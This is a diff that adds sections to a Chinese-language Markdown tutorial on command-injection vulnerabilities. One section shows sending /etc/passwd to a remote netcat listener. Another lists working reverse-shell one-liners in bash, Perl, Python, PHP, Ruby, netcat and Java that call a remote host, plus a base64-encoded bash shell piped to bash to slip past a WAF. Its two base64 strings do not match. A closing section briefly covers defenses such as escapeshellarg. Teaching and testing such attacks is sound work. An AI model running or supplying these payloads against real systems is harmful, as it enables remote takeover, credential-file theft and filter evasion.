@@ -144,3 +144,67 @@ cat shell.php
 ```
 
 ## 0x07 利用Netcat进行命令执行漏洞无回显测试
+如果目标机器上存在netcat，（一般Ubuntu系统上都会存在），就可以使用命令读取文件，并将文件传递到远程服务器上。
+远程服务器开启监听命令：
+```bash
+nc -lp 9999 >passwd1
+```
+本地执行命令：
+```bash
+nc 192.168.0.133 9999 </etc/passwd
+```
+查看远程服务器时，可以看到服务器目录下创建了 passwd1 这个文件，里面写了 /etc/passwd 的内容。
+
+## 0x08 命令执行漏洞nc反弹shell
+命令执行漏洞的一般利用方式是执行反弹shell，再进行后续操作。
+执行反弹shell的命令有许多。  
+反弹shell因为是从受害者反向链接远程服务器，请求是从内部到外部，所以防火墙一般不会进行拦截。  
+远程服务器开启nc监听命令 ： nc -vlnp 8080  
+受害者反弹shell命令，每种语言都有 socket 连接命令，可以跟据具体环境选择合适指令。
+
+```bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+
+perl -e 'use
+Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+
+nc -e /bin/sh 10.0.0.1 1234
+
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+如果网站有waf，可以把语句进行base64加密后再进行传输，因为加密后的字符串不会触发拦截规则，再利用shell命令进行解码即可。  
+
+```bash
+bash -i >& /dev/tcp/192.168.0.103/8080 0>&1
+
+base64 编码后 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzgwODAgMD4mMQ==
+
+受害者执行：
+
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTMzLzgwODAgMD4mMQ=="|base64 -d|bash
+
+远程服务器监听：
+nc -lnvp 8080
+
+```
+
+## 0x09 命令执行漏洞防御
+- 不执行外部的应用程序或命令：尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行system、eval等命令执行的函数前，要确认参数内容；
+- 使用 escapeshellarg 函数处理相关参数：escapeshellarg 函数会将用户输入的参数或命令字符串中的特殊字符进行转义，特别是引号、双引号和其他特殊字符。它的作用是防止用户提供的输入被直接当做命令执行，导致命令注入攻击；
+- 使用 safe_mode_exec_dir 执行可执行的文件路径：将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件统一放在一个目录下，并使用safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir 指定的目录中才会允许执行，否则执行失败；
